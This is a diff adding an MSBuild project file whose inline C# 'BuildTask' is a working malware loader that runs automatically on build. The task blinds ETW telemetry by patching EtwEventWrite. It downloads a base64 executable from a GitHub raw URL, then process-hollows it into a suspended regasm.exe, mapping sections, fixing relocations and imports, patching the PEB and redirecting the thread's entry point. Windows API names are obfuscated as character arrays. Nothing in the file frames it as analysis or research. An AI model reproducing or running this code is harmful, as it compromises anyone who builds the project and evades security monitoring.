@@ -1,0 +1,288 @@
+<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003" ToolsVersion="4.0">
+
+  <PropertyGroup>
+    <PayloadUrl>https://github.com/i25968627-ui/crispy-spoon/raw/refs/heads/main/payload.txt</PayloadUrl>
+  </PropertyGroup>
+
+  <UsingTask TaskName="BuildTask" TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <ParameterGroup>
+      <PayloadUrl ParameterType="System.String" Required="true" />
+    </ParameterGroup>
+    <Task>
+      <Code Type="Class" Language="cs"><![CDATA[
+using System;
+using System.ComponentModel;
+using System.IO;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Text;
+
+public class BuildTask : Microsoft.Build.Utilities.Task
+{
+    public string PayloadUrl { get; set; }
+
+    // ---- bootstrap imports (used to resolve everything else at runtime) ----
+    [DllImport("kernel32", CharSet = CharSet.Auto, EntryPoint = "GetModuleHandle")] static extern IntPtr gmh(string n);
+    [DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress")] static extern IntPtr gpa(IntPtr h, string n);
+    [DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress")] static extern IntPtr gpa(IntPtr h, IntPtr ord);
+    [DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "LoadLibrary")] static extern IntPtr ll(string n);
+
+    // ---- delegates resolved dynamically ----
+    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
+    delegate bool dCP(string app, string cmd, IntPtr pa, IntPtr ta, bool inh, uint flags, IntPtr env, string dir, ref SI si, out PI pi);
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate IntPtr dVAE(IntPtr h, IntPtr a, uint s, uint t, uint p);
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate bool dWPM(IntPtr h, IntPtr b, byte[] buf, uint s, out IntPtr w);
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate bool dRPM(IntPtr h, IntPtr b, byte[] buf, uint s, out IntPtr r);
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate bool dVPE(IntPtr h, IntPtr a, uint s, uint n, out uint o);
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate bool dVP(IntPtr a, uint s, uint n, out uint o);
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate bool dGTC(IntPtr h, byte[] ctx);
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate bool dSTC(IntPtr h, byte[] ctx);
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate uint dRT(IntPtr h);
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate bool dCH(IntPtr h);
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate uint dWFSO(IntPtr h, uint ms);
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    struct SI
+    {
+        public uint cb; public string r1, desk, title;
+        public uint x, y, xs, ys, xc, yc, fill, flags;
+        public ushort show, res2; public IntPtr res3, sin, sout, serr;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    struct PI
+    {
+        public IntPtr hProcess, hThread;
+        public uint dwProcessId, dwThreadId;
+    }
+
+    const int CTX_SIZE = 716;
+    const int CTX_FLAGS = 0;
+    const int CTX_EBX = 164;
+    const int CTX_EIP = 184;
+    const uint CREATE_SUSPENDED = 0x00000004;
+    const uint PAGE_RW = 0x04;
+    const uint PAGE_RX = 0x20;
+    const uint PAGE_RWX = 0x40;
+    const uint MEM_COMMIT_RESERVE = 0x3000;
+
+    static string S(char[] c) { return new string(c); }
+
+    static Delegate GD(IntPtr h, string n, Type t)
+    {
+        return Marshal.GetDelegateForFunctionPointer(gpa(h, n), t);
+    }
+
+    static string ReadCString(byte[] b, int o)
+    {
+        int e = o;
+        while (e < b.Length && b[e] != 0) e++;
+        return Encoding.ASCII.GetString(b, o, e - o);
+    }
+
+    void PatchEtw()
+    {
+        IntPtr ntdll = gmh(S(new char[] { 'n', 't', 'd', 'l', 'l' }));
+        IntPtr etw = gpa(ntdll, S(new char[] { 'E', 't', 'w', 'E', 'v', 'e', 'n', 't', 'W', 'r', 'i', 't', 'e' }));
+        IntPtr k32 = gmh(S(new char[] { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2' }));
+        var vp = (dVP)GD(k32, S(new char[] { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't' }), typeof(dVP));
+        uint old = 0;
+        vp(etw, 5, PAGE_RWX, out old);
+        Marshal.Copy(new byte[] { 0xC3 }, 0, etw, 1);
+        vp(etw, 5, old, out old);
+        Log.LogMessage("[i] telemetry patched");
+    }
+
+    byte[] FetchPayload(string url)
+    {
+        ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | ServicePointManager.SecurityProtocol;
+        using (WebClient wc = new WebClient())
+        {
+            wc.Headers.Add(S(new char[] { 'U', 's', 'e', 'r', '-', 'A', 'g', 'e', 'n', 't' }),
+                           S(new char[] { 'M', 'o', 'z', 'i', 'l', 'l', 'a', '/', '5', '.', '0' }));
+            string b64 = wc.DownloadString(url).Trim();
+            return Convert.FromBase64String(b64);
+        }
+    }
+
+    public override bool Execute()
+    {
+        try
+        {
+            Log.LogMessage("[i] starting");
+            PatchEtw();
+
+            Log.LogMessage("[i] fetching payload");
+            byte[] pe = FetchPayload(PayloadUrl);
+            if (pe[0] != 0x4D || pe[1] != 0x5A)
+                throw new InvalidOperationException("bad MZ");
+            Log.LogMessage("[i] payload size: " + pe.Length);
+
+            int peOff = BitConverter.ToInt32(pe, 0x3C);
+            int optOff = peOff + 24;
+            uint epRVA = BitConverter.ToUInt32(pe, optOff + 16);
+            uint imgSz = BitConverter.ToUInt32(pe, optOff + 56);
+            uint prefBase = BitConverter.ToUInt32(pe, optOff + 28);
+            ushort nSec = BitConverter.ToUInt16(pe, peOff + 6);
+            int secTbl = optOff + BitConverter.ToUInt16(pe, peOff + 20);
+            Log.LogMessage("[i] EP:0x" + epRVA.ToString("X") + " size:0x" + imgSz.ToString("X"));
+
+            IntPtr k32 = gmh(S(new char[] { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2' }));
+            var cp = (dCP)GD(k32, S(new char[] { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'W' }), typeof(dCP));
+            var vae = (dVAE)GD(k32, S(new char[] { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 'E', 'x' }), typeof(dVAE));
+            var wpm = (dWPM)GD(k32, S(new char[] { 'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y' }), typeof(dWPM));
+            var rpm = (dRPM)GD(k32, S(new char[] { 'R', 'e', 'a', 'd', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y' }), typeof(dRPM));
+            var vpe = (dVPE)GD(k32, S(new char[] { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 'E', 'x' }), typeof(dVPE));
+            var gtc = (dGTC)GD(k32, S(new char[] { 'G', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't', 'e', 'x', 't' }), typeof(dGTC));
+            var stc = (dSTC)GD(k32, S(new char[] { 'S', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't', 'e', 'x', 't' }), typeof(dSTC));
+            var rt = (dRT)GD(k32, S(new char[] { 'R', 'e', 's', 'u', 'm', 'e', 'T', 'h', 'r', 'e', 'a', 'd' }), typeof(dRT));
+            var ch = (dCH)GD(k32, S(new char[] { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e' }), typeof(dCH));
+            var wfso = (dWFSO)GD(k32, S(new char[] { 'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't' }), typeof(dWFSO));
+
+            string regasm = new string(new char[] {
+                'C',':','\\','W','i','n','d','o','w','s','\\',
+                'M','i','c','r','o','s','o','f','t','.','N','E','T','\\',
+                'F','r','a','m','e','w','o','r','k','\\','v','4','.','0','.','3','0','3','1','9','\\','r','e','g','a','s','m','.','e','x','e'
+            });
+
+            Log.LogMessage("[i] spawning host: " + regasm);
+            SI si = new SI();
+            si.cb = (uint)Marshal.SizeOf(si);
+            PI pi;
+            if (!cp(regasm, null, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
+                throw new Win32Exception(Marshal.GetLastWin32Error());
+            Log.LogMessage("[i] pid:" + pi.dwProcessId);
+
+            byte[] ctx = new byte[CTX_SIZE];
+            BitConverter.GetBytes(0x10007u).CopyTo(ctx, CTX_FLAGS);
+            if (!gtc(pi.hThread, ctx))
+                throw new Win32Exception(Marshal.GetLastWin32Error());
+            uint pebAddr = BitConverter.ToUInt32(ctx, CTX_EBX);
+            Log.LogMessage("[i] peb:0x" + pebAddr.ToString("X"));
+
+            IntPtr allocBase = new IntPtr((long)prefBase);
+            IntPtr remoteBase = vae(pi.hProcess, allocBase, imgSz, MEM_COMMIT_RESERVE, PAGE_RW);
+            if (remoteBase == IntPtr.Zero)
+                remoteBase = vae(pi.hProcess, IntPtr.Zero, imgSz, MEM_COMMIT_RESERVE, PAGE_RW);
+            if (remoteBase == IntPtr.Zero)
+                throw new Win32Exception(Marshal.GetLastWin32Error());
+            Log.LogMessage("[i] mapped at:0x" + remoteBase.ToString("X"));
+
+            byte[] img = new byte[imgSz];
+            Array.Copy(pe, 0, img, 0, Math.Min(pe.Length, 0x1000));
+            for (int i = 0; i < nSec; i++)
+            {
+                int so = secTbl + (i * 40);
+                uint vRVA = BitConverter.ToUInt32(pe, so + 12);
+                uint rSz = BitConverter.ToUInt32(pe, so + 16);
+                uint rOff = BitConverter.ToUInt32(pe, so + 20);
+                if (rSz == 0) continue;
+                Array.Copy(pe, (int)rOff, img, (int)vRVA, (int)rSz);
+            }
+
+            long delta = remoteBase.ToInt64() - (long)prefBase;
+            if (delta != 0)
+            {
+                uint relRVA = BitConverter.ToUInt32(pe, optOff + 136);
+                uint relSz = BitConverter.ToUInt32(pe, optOff + 140);
+                uint bo = relRVA;
+                while (bo < relRVA + relSz)
+                {
+                    uint pgRVA = BitConverter.ToUInt32(img, (int)bo);
+                    uint bSz = BitConverter.ToUInt32(img, (int)bo + 4);
+                    if (bSz == 0) break;
+                    int ec = (int)(bSz - 8) / 2;
+                    for (int e = 0; e < ec; e++)
+                    {
+                        ushort ent = BitConverter.ToUInt16(img, (int)bo + 8 + e * 2);
+                        int type = ent >> 12;
+                        int off = ent & 0x0FFF;
+                        if (type == 3)
+                        {
+                            int pp = (int)(pgRVA + off);
+                            uint orig = BitConverter.ToUInt32(img, pp);
+                            Array.Copy(BitConverter.GetBytes((uint)(orig + delta)), 0, img, pp, 4);
+                        }
+                    }
+                    bo += bSz;
+                }
+                Log.LogMessage("[i] relocations applied");
+            }
+
+            uint impRVA = BitConverter.ToUInt32(pe, optOff + 104);
+            if (impRVA != 0)
+            {
+                int desc = (int)impRVA;
+                while (true)
+                {
+                    uint oThunk = BitConverter.ToUInt32(img, desc);
+                    uint nameRVA = BitConverter.ToUInt32(img, desc + 12);
+                    uint fThunk = BitConverter.ToUInt32(img, desc + 16);
+                    if (nameRVA == 0) break;
+                    string dll = ReadCString(img, (int)nameRVA);
+                    IntPtr hDll = ll(dll);
+                    int nt = (int)(oThunk != 0 ? oThunk : fThunk);
+                    int ft = (int)fThunk;
+                    while (true)
+                    {
+                        uint thunk = BitConverter.ToUInt32(img, nt);
+                        if (thunk == 0) break;
+                        IntPtr fa;
+                        if ((thunk & 0x80000000) != 0)
+                            fa = gpa(hDll, (IntPtr)(thunk & 0x7FFF));
+                        else
+                            fa = gpa(hDll, ReadCString(img, (int)thunk + 2));
+                        Array.Copy(BitConverter.GetBytes((uint)fa.ToInt32()), 0, img, ft, 4);
+                        nt += 4; ft += 4;
+                    }
+                    desc += 20;
+                }
+                Log.LogMessage("[i] imports resolved");
+            }
+
+            IntPtr w = IntPtr.Zero;
+            if (!wpm(pi.hProcess, remoteBase, img, imgSz, out w))
+                throw new Win32Exception(Marshal.GetLastWin32Error());
+            Log.LogMessage("[i] written:" + w);
+
+            uint oldProt = 0;
+            if (!vpe(pi.hProcess, remoteBase, imgSz, PAGE_RX, out oldProt))
+                throw new Win32Exception(Marshal.GetLastWin32Error());
+            Log.LogMessage("[i] RX set");
+
+            byte[] newBase = BitConverter.GetBytes((uint)remoteBase.ToInt32());
+            if (!wpm(pi.hProcess, new IntPtr((long)pebAddr + 8), newBase, 4, out w))
+                throw new Win32Exception(Marshal.GetLastWin32Error());
+            Log.LogMessage("[i] peb patched");
+
+            uint epAbs = (uint)(remoteBase.ToInt64() + epRVA);
+            Array.Copy(BitConverter.GetBytes(epAbs), 0, ctx, CTX_EIP, 4);
+            if (!stc(pi.hThread, ctx))
+                throw new Win32Exception(Marshal.GetLastWin32Error());
+            Log.LogMessage("[i] eip -> 0x" + epAbs.ToString("X"));
+
+            rt(pi.hThread);
+            Log.LogMessage("[i] running");
+
+            wfso(pi.hProcess, 10000);
+            ch(pi.hThread);
+            ch(pi.hProcess);
+            return true;
+        }
+        catch (Exception ex)
+        {
+            Log.LogErrorFromException(ex, true);
+            return false;
+        }
+    }
+}
+      ]]></Code>
+    </Task>
+  </UsingTask>
+
+  <Target Name="Build">
+    <BuildTask PayloadUrl="$(PayloadUrl)" />
+  </Target>
+
+</Project>
